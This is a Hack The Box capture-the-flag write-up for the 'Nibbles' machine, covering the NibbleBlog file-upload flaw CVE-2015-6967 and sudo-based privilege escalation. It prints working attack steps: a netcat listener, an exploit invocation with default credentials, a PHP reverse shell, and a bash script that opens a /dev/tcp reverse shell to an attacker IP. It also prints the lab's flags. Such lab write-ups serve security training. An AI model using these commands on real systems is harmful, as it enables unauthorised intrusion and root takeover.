Nibbles is a very smooth box that runs close to HTB standards for easier machines... Thorough web enumeration and simple privilege escalation. Let's get it.

### Enumeration

This box has two connections on ports 22 and 80, running their respective services. You know how I feel about SSH, so we'll start with port 80.

##### 80 - NibbleBlog

The landing page of the website doesn't give us much. However, when we take a closer look, we're given a bone. Using this newfound directory, we can feed feroxbuster (I know, no gobuster anymore) our parameters and get a lot of information.

Moseying around some of these yields very valuable information, including usernames and versions. The kicker, though, comes from doing our research online.

We find out about CVE-2015-6967, which allows us to upload unrestricted files to the server, and access via `content/private/plugins/my_image/image.php`. We also can find a python script built for this blog specifically, and even some credentials hanging around... (I'll take it!)

### Initial Access

Downloading the script, we need to find a PHP reverse shell that we can couple with it, because the script will give us access to our payload through the server. I used: `/usr/share/laudanum/php/php-reverse-shell.php`. Once the parameters are configured with hosts and credentials, set up a wrapped listener and fire away.

`rlwrap nc -nlvp XXXX`

`exploit.py  -l http://10.10.10.75/nibbleblog/ --username admin --password nibbles --payload php-reverse-shell.php`

Once we have a shell, we need to stabilize it

Then, we can navigate to the home directory for our flag.

`USER:2df045e9e5b920914459d4ae04491c9b`

### Privilege Escalation

Once in our shell and looking to move vertically, we can run `sudo -l` to get an idea of what we can and cannot do. As seen below, we've got access to the `monitor.sh` executable, which is great news for us.

All that needs to be done is overwrite the original script with a Bash one-liner pointing to another listener that we have set up on our Kali box.

The directory is hidden behind a zip file, so unzip.

Then, rewrite the script using the line below. `nano` and `vim` were being very touchy, so I just used `echo`.

```
echo -e '#!/bin/bash

# Define the IP address and port of the remote listener
REMOTE_IP="10.10.14.3" # Replace with your IP
REMOTE_PORT="9001"        # Replace with your desired port

# Ensure the script is running with root privileges
if [[ "$EUID" -ne 0 ]]; then
  echo "Please run this script as root."
  exit 1
fi

# Attempt to open a reverse shell using netcat
echo "Opening a reverse shell to $REMOTE_IP:$REMOTE_PORT..."
/bin/bash -i >& /dev/tcp/$REMOTE_IP/$REMOTE_PORT 0>&1' > monitor.sh
```

Once you've popped the root shell, `cd` to the directory and grab your flag.

`ROOT:1b7cbd064fd08f66523ddc338bf1b985`
